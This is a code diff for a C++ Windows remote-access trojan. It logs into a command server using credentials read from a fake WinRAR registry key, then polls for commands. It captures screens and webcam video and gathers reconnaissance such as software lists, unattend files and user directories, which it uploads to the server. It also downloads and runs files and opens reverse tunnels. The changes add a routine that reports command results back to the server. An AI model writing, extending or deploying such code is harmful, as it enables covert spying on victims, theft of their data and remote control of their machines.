@@ -26,6 +26,10 @@ struct CommandInfo {
     std::string extra;
 };
 
+std::string extra;
+std::string hexHash;
+
+
 std::string toHex(const std::string& input) {
     std::stringstream hexStream;
     hexStream << std::hex << std::setfill('0');
@@ -52,7 +56,7 @@ std::string GetRegistryValue(HKEY hKey, const std::string& subKey, const std::st
         }
         RegCloseKey(hSubKey);
     }
-    return ""; // Retourne une chaîne vide si la valeur n'a pas été trouvée ou s'il y a eu une erreur.
+    return "";
 }
 
 std::string getExecutablePath() {
@@ -70,30 +74,26 @@ std::string calculateSHA256Hash(const std::string& filePath) {
         HCRYPTHASH hHash = 0;
         DWORD bytesRead = 0;
         BYTE buffer[4096] = { 0 };
-        DWORD dwDataLen = sizeof(buffer);
-        DWORD dwHashLen = 0;
-        DWORD cbHashSize = 0;
-        DWORD cbBlockSize = 0;
-        DWORD dwCount = 0;
 
-        CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_MACHINE_KEYSET);
+        if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_MACHINE_KEYSET)) {
+            if (CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
+                while (ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead != 0) {
+                    CryptHashData(hHash, buffer, bytesRead, 0);
+                }
 
-        if (CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
-            while (ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead != 0) {
-                CryptHashData(hHash, buffer, bytesRead, 0);
+                DWORD dwHashLen = 0;
+                DWORD cbHashSize = sizeof(DWORD);
+                if (CryptGetHashParam(hHash, HP_HASHSIZE, (BYTE*)&dwHashLen, &cbHashSize, 0)) {
+                    hashResult.resize(dwHashLen);
+                    CryptGetHashParam(hHash, HP_HASHVAL, (BYTE*)&hashResult[0], &dwHashLen, 0);
+                }
+
+                CryptDestroyHash(hHash);
             }
 
-            cbHashSize = sizeof(DWORD);
-            if (CryptGetHashParam(hHash, HP_HASHSIZE, (BYTE*)&dwHashLen, &cbHashSize, 0)) {
-                cbBlockSize = dwHashLen;
-                hashResult.resize(cbBlockSize);
-                CryptGetHashParam(hHash, HP_HASHVAL, (BYTE*)&hashResult[0], &dwHashLen, 0);
-            }
-
-            CryptDestroyHash(hHash);
+            CryptReleaseContext(hProv, 0);
         }
 
-        CryptReleaseContext(hProv, 0);
         CloseHandle(hFile);
     }
 
@@ -153,13 +153,15 @@ CommandInfo extractCommandInfoFromJson(const std::string& jsonResponse) {
     return commandInfo;
 }
 
-void performLogout(CURL* curl, const char* logoutUrl, const char* cookies) {
+void performLogout(CURL* curl, const char* logoutUrl, const char* cookies,const std::string& hexHash) {
     curl_easy_reset(curl);
     curl_easy_setopt(curl, CURLOPT_URL, logoutUrl);
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
     curl_easy_setopt(curl, CURLOPT_REFERER, logoutUrl);
     curl_easy_setopt(curl, CURLOPT_COOKIEFILE, cookies);
+    curl_easy_setopt(curl, CURLOPT_USERAGENT, hexHash.c_str());
+
     CURLcode res = curl_easy_perform(curl);
 
     if (res != CURLE_OK) {
@@ -169,7 +171,40 @@ void performLogout(CURL* curl, const char* logoutUrl, const char* cookies) {
     }
 }
 
-void performFileUpload(CURL* curl, const char* uploadUrl, const char* commandsUrl, const char* compressedArchivePath, const CommandInfo& commandInfo, const std::string& csrfToken) {
+void sendFormResults(CURL* curl, const std::string& formUrl, const std::string& commandsUrl, const std::string& command, const std::string& extra, const std::string& uuid, const std::string& result, const std::string& csrfToken,const std::string& hexHash) {
+    // Réinitialiser les options cURL
+    curl_easy_reset(curl);
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+    curl_easy_setopt(curl, CURLOPT_URL, formUrl);
+    curl_easy_setopt(curl, CURLOPT_POST, 1L);
+    curl_easy_setopt(curl, CURLOPT_REFERER, commandsUrl);
+    curl_easy_setopt(curl, CURLOPT_USERAGENT, hexHash.c_str());
+
+
+    // Construire les données POST
+    std::string postData = "command=" + command +
+                            "&extra=" + extra +
+                            "&uuid=" + uuid +
+                            "&result=" + result +
+                            "&csrf_token=" + csrfToken;
+
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData.c_str());
+
+    // Exécuter la requête
+    CURLcode res = curl_easy_perform(curl);
+
+    if (res != CURLE_OK) {
+        std::cerr << "Erreur cURL (envoi de résultats) : " << curl_easy_strerror(res) << std::endl;
+    } else {
+        std::cout << "Résultats envoyés avec succès !" << std::endl;
+    }
+}
+
+
+
+
+void performFileUpload(CURL* curl, const char* uploadUrl, const char* commandsUrl, const char* compressedArchivePath, const CommandInfo& commandInfo, const std::string& csrfToken,const std::string& hexHash) {
     // Reset cURL options
     curl_easy_reset(curl);
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
@@ -177,6 +212,7 @@ void performFileUpload(CURL* curl, const char* uploadUrl, const char* commandsUr
     curl_easy_setopt(curl, CURLOPT_URL, uploadUrl);
     curl_easy_setopt(curl, CURLOPT_POST, 1L);
     curl_easy_setopt(curl, CURLOPT_REFERER, commandsUrl);
+    curl_easy_setopt(curl, CURLOPT_USERAGENT, hexHash.c_str());
 
     // Set up the form data
     struct curl_httppost* post = nullptr;
@@ -210,6 +246,7 @@ void performFileUpload(CURL* curl, const char* uploadUrl, const char* commandsUr
     }
 }
 
+
 bool runInBackground(const char* executablePath) {
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
@@ -241,8 +278,7 @@ bool runInBackground(const char* executablePath) {
 bool downloadFile(const std::string& url, const std::string& destinationPath) {
     CURL* curl;
     CURLcode res;
-    std::string downloadedData; // Stockage des données téléchargées
-
+    std::string downloadedData;
     curl_global_init(CURL_GLOBAL_DEFAULT);
     curl = curl_easy_init();
 
@@ -251,8 +287,7 @@ bool downloadFile(const std::string& url, const std::string& destinationPath) {
         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
         curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
-        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &downloadedData); // Utilisez downloadedData pour stocker les données téléchargées
-
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &downloadedData);
         res = curl_easy_perform(curl);
 
         if (res != CURLE_OK) {
@@ -261,7 +296,6 @@ bool downloadFile(const std::string& url, const std::string& destinationPath) {
             return false;
         }
 
-        // Écrire les données téléchargées dans le fichier de destination
         FILE* fp = fopen(destinationPath.c_str(), "wb");
         if (!fp) {
             std::cerr << "Failed to open file for writing: " << destinationPath << std::endl;
@@ -404,7 +438,7 @@ std::unordered_map<std::string, std::string> executeAllCommands() {
     executePowerShellCommand("Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate", system_outputs, "installed_software_POWERSHELL");
     executePowerShellCommand("Get-ChildItem 'C:\\Windows\\sysprep\\sysprep.xml', 'C:\\Windows\\sysprep\\sysprep.inf', 'C:\\Windows\\sysprep.inf', 'C:\\Windows\\Panther\\Unattended.xml', 'C:\\Windows\\Panther\\Unattend.xml', 'C:\\Windows\\Panther\\Unattend\\Unattend.xml', 'C:\\Windows\\Panther\\Unattend\\Unattended.xml', 'C:\\Windows\\System32\\Sysprep\\unattend.xml', 'C:\\Windows\\System32\\Sysprep\\unattended.xml', 'C:\\unattend.txt', 'C:\\unattend.inf' | Format-Table -Property Name, FullName", system_outputs, "sysprep_files");
     executeCommand(R"(dir C:\$Recycle.Bin /s /b)", system_outputs["recycle_BIN"]);
-    executeCommand("dir /s /b %TEMP% & dir /s /b %windir%\Temp", system_outputs["tempory_files"]);
+    executeCommand("dir /s /b %TEMP% & dir /s /b %windir%\\Temp", system_outputs["tempory_files"]);
     executeCommand("dir /b c:\\users", system_outputs["user_directories"]);
     return system_outputs;
 }
@@ -452,11 +486,61 @@ void writeHtmlFile(const std::unordered_map<std::string, std::string>& system_ou
     }
 }
 
+bool performAuthentication(CURL* curl, const std::string& loginUrl, const std::string& Username, const std::string& Password, const std::string& Secret, const std::string& hexHash, std::string& csrfToken, const std::string& cookies) {
+    std::string htmlContent;
+    CURLcode res;
+
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+    curl_easy_setopt(curl, CURLOPT_USERAGENT, hexHash.c_str());
+
+    curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "");
+    curl_easy_setopt(curl, CURLOPT_COOKIEFILE, cookies.c_str());
+    
+    curl_easy_setopt(curl, CURLOPT_URL, loginUrl.c_str());
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &htmlContent);
+    res = curl_easy_perform(curl);
+
+    if (res != CURLE_OK) {
+        std::cerr << "cURL Error (CSRF token retrieval): " << curl_easy_strerror(res) << std::endl;
+        return false;
+    }
+
+    csrfToken = extractCsrfToken(htmlContent);
+    if (csrfToken.empty()) {
+        std::cerr << "Unable to find CSRF token in HTML response." << std::endl;
+        return false;
+    }
+
+    std::cout << "CSRF Token: " << csrfToken << std::endl;
+    curl_easy_reset(curl);
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+    curl_easy_setopt(curl, CURLOPT_USERAGENT, hexHash.c_str());
+    curl_easy_setopt(curl, CURLOPT_URL, loginUrl.c_str());
+    curl_easy_setopt(curl, CURLOPT_REFERER, loginUrl.c_str());
+    std::string postFields = "username=" + Username + "&password=" + Password + "&secret=" + Secret + "&csrf_token=" + csrfToken;
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postFields.c_str());
+    curl_easy_setopt(curl, CURLOPT_COOKIEFILE, cookies.c_str());
+    res = curl_easy_perform(curl);
+
+    if (res != CURLE_OK) {
+        std::cerr << "cURL Error (login): " << curl_easy_strerror(res) << std::endl;
+        return false;
+    }
+
+    return true;
+}
+
 
 int main() {
     std::string user;
     std::string password;
     std::string secret;
+    std::string csrfToken; 
+    std::string result;
+    CURLcode res; 
     const std::string keyPath = "Software\\WinRAR\\hclient";
     std::string Username = GetRegistryValue(HKEY_CURRENT_USER, keyPath, "user");
     std::string Password = GetRegistryValue(HKEY_CURRENT_USER, keyPath, "password");
@@ -465,10 +549,14 @@ int main() {
     std::string loginUrl = std::string(URL) + "/login";
     std::string commandsUrl = std::string(URL) + "/get_commands";
     std::string uploadUrl = std::string(URL) + "/upload";
+    std::string formUrl = std::string(URL) + "/result";
     std::string cookies;
+    std::string htmlContent; 
+
     std::string executablePath = getExecutablePath();
     std::string hash = calculateSHA256Hash(executablePath);
-    std::cout << "SHA-256 Hash of the executable: " << toHex(hash) << std::endl;
+    std::string hexHash = toHex(hash);
+    std::cout << "SHA-256 Hash of the executable: " << hexHash << std::endl;
   
     std::cout << "User: " << Username << std::endl;
     std::cout << "Password: " << Password << std::endl;
@@ -482,46 +570,9 @@ int main() {
             std::this_thread::sleep_for(std::chrono::minutes(3));
             continue;
         }
+        bool authenticated = performAuthentication(curl, loginUrl, Username, Password, Secret, hexHash, csrfToken, cookies);
 
-        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
-        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
-        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "");
-        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, cookies.c_str());
-        
-        std::string htmlContent;
-        curl_easy_setopt(curl, CURLOPT_URL, loginUrl);
-        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
-        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &htmlContent);
-        CURLcode res = curl_easy_perform(curl);
-
-        if (res != CURLE_OK) {
-            std::cerr << "cURL Error (CSRF token retrieval): " << curl_easy_strerror(res) << std::endl;
-            curl_easy_cleanup(curl);
-            std::this_thread::sleep_for(std::chrono::minutes(3));
-            continue;
-        }
-
-        std::string csrfToken = extractCsrfToken(htmlContent);
-        if (csrfToken.empty()) {
-            std::cerr << "Unable to find CSRF token in HTML response." << std::endl;
-            curl_easy_cleanup(curl);
-            std::this_thread::sleep_for(std::chrono::minutes(3));
-            continue;
-        }
-
-        std::cout << "CSRF Token: " << csrfToken << std::endl;
-        curl_easy_reset(curl);
-        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
-        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
-        curl_easy_setopt(curl, CURLOPT_URL, loginUrl);
-        curl_easy_setopt(curl, CURLOPT_REFERER, loginUrl);
-        std::string postFields = "username=" + Username + "&password=" + Password + "&secret=" + Secret + "&csrf_token=" + csrfToken;
-        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postFields.c_str());
-        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, cookies.c_str());
-        res = curl_easy_perform(curl);
-
-        if (res != CURLE_OK) {
-            std::cerr << "cURL Error (login): " << curl_easy_strerror(res) << std::endl;
+        if (!authenticated) {
             curl_easy_cleanup(curl);
             std::this_thread::sleep_for(std::chrono::minutes(3));
             continue;
@@ -532,6 +583,8 @@ int main() {
         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
         curl_easy_setopt(curl, CURLOPT_URL, commandsUrl);
         curl_easy_setopt(curl, CURLOPT_REFERER, loginUrl);
+        curl_easy_setopt(curl, CURLOPT_USERAGENT, hexHash.c_str());
+
         curl_easy_setopt(curl, CURLOPT_COOKIEFILE, cookies.c_str());
         htmlContent.clear();
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
@@ -555,72 +608,55 @@ int main() {
             ScreenCapture screenCapture;
             screenCapture.CaptureScreensAndSave();
             std::cout << "Screen capture completed!" << std::endl;
-
             const char* outputArchiveNamePattern = "*.bmp";
             std::string compressedArchivePath = compressFilesInCurrentDirectory(outputArchiveNamePattern);
-
             deleteFiles("bmp"); 
-
-
             std::cout << "Compressed archive path: " << compressedArchivePath << std::endl;
-            
-            performFileUpload(curl, uploadUrl.c_str(), commandsUrl.c_str(), compressedArchivePath.c_str(), commandInfo, csrfToken);
-
-
+            performFileUpload(curl, uploadUrl.c_str(), commandsUrl.c_str(), compressedArchivePath.c_str(), commandInfo, csrfToken, hexHash);
             
         } else if (commandInfo.command == "get_camera") {
             std::cout << "Extracted Command: " << commandInfo.command << std::endl;
             std::cout << "Extracted UUID: " << commandInfo.uuid << std::endl;
-
             detectCameras();
             int cameraIndex = 1;  
             std::chrono::seconds duration(10);    
-
             recordVideo(cameraIndex, duration);
             const char* outputArchiveNamePattern = "*.avi";
             std::string compressedArchivePath = compressFilesInCurrentDirectory(outputArchiveNamePattern);
-
-            deleteFiles("avi"); //
-
+            deleteFiles("avi");
             std::cout << "Compressed archive path: " << compressedArchivePath << std::endl;
+            performFileUpload(curl, uploadUrl.c_str(), commandsUrl.c_str(), compressedArchivePath.c_str(), commandInfo, csrfToken, hexHash);
 
-            performFileUpload(curl, uploadUrl.c_str(), commandsUrl.c_str(), compressedArchivePath.c_str(), commandInfo, csrfToken);
-
-        
         } else if (commandInfo.command == "get_recon_info") {
             std::cout << "Extracted Command: " << commandInfo.command << std::endl;
             std::cout << "Extracted UUID: " << commandInfo.uuid << std::endl;
-
             std::unordered_map<std::string, std::string> system_outputs = executeAllCommands();
             writeHtmlFile(system_outputs);
             const char* outputArchiveNamePattern = "*.html";
             std::string compressedArchivePath = compressFilesInCurrentDirectory(outputArchiveNamePattern);
-
-            deleteFiles("html"); //
-
+            deleteFiles("html");
             std::cout << "Compressed archive path: " << compressedArchivePath << std::endl;
-
-            performFileUpload(curl, uploadUrl.c_str(), commandsUrl.c_str(), compressedArchivePath.c_str(), commandInfo, csrfToken);
-
+            performFileUpload(curl, uploadUrl.c_str(), commandsUrl.c_str(), compressedArchivePath.c_str(), commandInfo, csrfToken, hexHash);
 
         } else if (commandInfo.command == "download_file") {
             std::cout << "Extracted Command: " << commandInfo.command << std::endl;
             std::cout << "Extracted UUID: " << commandInfo.uuid << std::endl;
             std::string downloadUrl = commandInfo.extra;
             std::string uuid = commandInfo.uuid;
-            
             if (downloadUrl.empty()) {
                 std::cerr << "Error: Empty download URL." << std::endl;
                 return 1; 
             }
             std::string filename = std::filesystem::path(downloadUrl).filename().string();
             std::string destinationPath = "./" + filename;
-
             if (downloadFile(downloadUrl, destinationPath)) {
                 std::cout << "File downloaded successfully to: " << destinationPath << std::endl;
+                result = "File downloaded successfully to: " + destinationPath;
             } else {
-                std::cerr << "Error downloading file: " << curl_easy_strerror(res) << std::endl;  
+                std::cerr << "Error downloading file: " << curl_easy_strerror(res) << std::endl; 
+                result = "Error downloading file: " + std::string(curl_easy_strerror(res));
             }
+            sendFormResults(curl, formUrl, commandsUrl, commandInfo.command, commandInfo.extra, commandInfo.uuid, result, csrfToken,hexHash);
 
         } else if (commandInfo.command == "upload_file") {
             std::cout << "Extracted Command: " << commandInfo.command << std::endl;
@@ -635,10 +671,9 @@ int main() {
 
             std::string filename = std::filesystem::path(filePath).filename().string();          
             compressedArchivePath = compressFilesInCurrentDirectory(filename.c_str());
-     
             if (std::filesystem::exists(compressedArchivePath)) {
 
-                performFileUpload(curl, uploadUrl.c_str(), commandsUrl.c_str(), compressedArchivePath.c_str(), commandInfo, csrfToken);
+                performFileUpload(curl, uploadUrl.c_str(), commandsUrl.c_str(), compressedArchivePath.c_str(), commandInfo, csrfToken, hexHash);
 
 
 
@@ -656,51 +691,46 @@ int main() {
                 std::cerr << "Error: Empty executable filename." << std::endl;
                 return 1; 
             }
-     
             if (executableFilename.find('/') == std::string::npos && executableFilename.find('\\') == std::string::npos) {
                 executableFilename = "./" + executableFilename;
             }
-      
             if (std::filesystem::exists(executableFilename)) {
             
                 if (runInBackground(executableFilename.c_str())) {
                     std::cout << "Program " << executablePath << " executed in the background." << std::endl;
+                    result = "Program executed in the background.";
                 } else {
                     std::cerr << "Error executing " << executablePath << " in the background. Error code: " << GetLastError() << std::endl;
+                    result = "Error executing in the background. Error code: " + std::to_string(GetLastError());
                 }
             } else {
                 std::cerr << "Error: Executable file does not exist at path: " << executableFilename << std::endl;
-            
+                result = "Error: Executable file does not exist at path: " + executableFilename;           
             }
-            
-                       
+            sendFormResults(curl, formUrl, commandsUrl, commandInfo.command, commandInfo.extra, commandInfo.uuid, result, csrfToken,hexHash);
+                      
         } else if (commandInfo.command == "rev_tun_port") {
             std::cout << "Executing reverse tunneling..." << std::endl;
             std::regex addressPortRegex("\\(\\s*([^:]+):(\\d+)\\s*\\)\\s*\\(\\s*([^:]+):(\\d+)\\s*\\)");
-            
-
             std::smatch addressPortMatch;
-
             if (std::regex_search(commandInfo.extra, addressPortMatch, addressPortRegex)) {
                 std::string adresseTunnel = addressPortMatch[1].str();
                 int portTunnel = std::stoi(addressPortMatch[2].str());
-
                 std::string adresseForward = addressPortMatch[3].str();
                 int portForward = std::stoi(addressPortMatch[4].str());
-
                 std::pair<std::string, int> tunnelAddress(adresseTunnel, portTunnel);
                 std::pair<std::string, int> forwardAddress(adresseForward, portForward);
-
                 TunnelingClient* tunnelingClient = new TunnelingClient(tunnelAddress, forwardAddress);
                 tunnelingClient->startTunneling();
-                
                 tunnelingClient->closeTunnels();
                 delete tunnelingClient;
 
-                
+                result = "Reverse tunneling executed successfully.";
             } else {
                 std::cerr << "Invalid 'extra' format for reverse tunneling command." << std::endl;
+                result = "Invalid 'extra' format for reverse tunneling command.";
             }
+           sendFormResults(curl, formUrl, commandsUrl, commandInfo.command, commandInfo.extra, commandInfo.uuid, result, csrfToken,hexHash);        
 
         } else {
             std::cerr << "Unable to initialize cURL." << std::endl;
